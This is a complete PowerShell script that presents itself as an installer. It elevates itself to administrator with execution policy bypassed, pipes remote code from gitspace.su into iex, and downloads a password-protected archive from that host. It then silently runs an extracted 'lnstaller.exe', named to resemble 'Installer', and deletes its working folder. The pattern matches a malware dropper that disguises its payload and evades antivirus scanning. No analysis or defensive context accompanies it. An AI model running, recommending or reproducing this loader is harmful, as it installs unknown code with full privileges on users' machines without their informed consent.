$ErrorActionPreference = 'Stop'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://gitspace.su | iex"'
    exit
}

$ProgressPreference = 'SilentlyContinue'

$zipUrl   = 'https://gitspace.su'
$7zaUrl   = 'https://github.com/TarantulaFire/vmtyilpj/releases/download/Last/7za.exe'
$password = '2026'
$exeName  = 'lnstaller.exe'

$work = Join-Path $env:TEMP "svc_$(Get-Random)"
$zip  = Join-Path $work 'r.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'out'

if (Test-Path $work) { Remove-Item $work -Recurse -Force }
New-Item -ItemType Directory -Path $work -Force | Out-Null

Write-Host "`n  [1/3] Downloading components..." -ForegroundColor Cyan
Invoke-RestMethod $7zaUrl -OutFile $7za -MaximumRedirection 5
Invoke-RestMethod $zipUrl -OutFile $zip -MaximumRedirection 5

Write-Host "  [2/3] Extracting files..."  -ForegroundColor Cyan

$null = & $7za x $zip "-o$dest" "-p$password" -y 2>&1
if ($LASTEXITCODE -ne 0) { throw "Extract failed. Wrong password?" }

Write-Host "  [3/3] Running setup..."    -ForegroundColor Cyan
$exe = Join-Path $dest $exeName
if (-not (Test-Path $exe)) {
    $found = Get-ChildItem $dest -Recurse -Filter $exeName | Select-Object -First 1
    if ($found) { $exe = $found.FullName }
    else { throw "Setup file ($exeName) not found inside ZIP" }
}

Start-Process $exe -ArgumentList '/S' -WorkingDirectory (Split-Path $exe) -Wait

Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "`n  Operation complete!" -ForegroundColor Green